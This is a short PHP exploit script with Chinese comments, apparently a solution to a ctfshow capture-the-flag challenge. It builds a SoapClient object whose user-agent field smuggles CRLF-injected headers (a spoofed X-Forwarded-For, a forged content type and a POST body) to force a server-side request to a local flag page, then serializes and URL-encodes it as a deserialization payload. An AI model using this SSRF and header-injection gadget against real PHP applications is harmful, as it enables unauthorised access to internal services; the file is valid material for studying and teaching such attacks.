<?php
//SSRF+CLRF
$target='http://127.0.0.1/flag.php';
$a = new SoapClient(null,
    array(
        'user_agent' => "chenser\r\nx-forwarded-for:127.0.0.1,127.0.0.1\r\nContent-type:application/x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow",
        'uri' => 'chenser',
        'location' => 'http://127.0.0.1/flag.php'
    )
);                                                          //\r\n:回车并换行
                                                            //xff为127.0.0.1,127.0.0.1绕过array_pop():删除数组最后一个元素
$b=serialize($a);
echo urlencode($b); //question1:为什么要urlencode？ PHP7特性 序列化字符串不可见字符无法识别
#$c=unserialize($a);
#$c->getflag();     //调用不存在的方法，让SoapClient调用__call
                    //question2:传入$b经unserialize是否会自动调用getflag()?  只触发__call


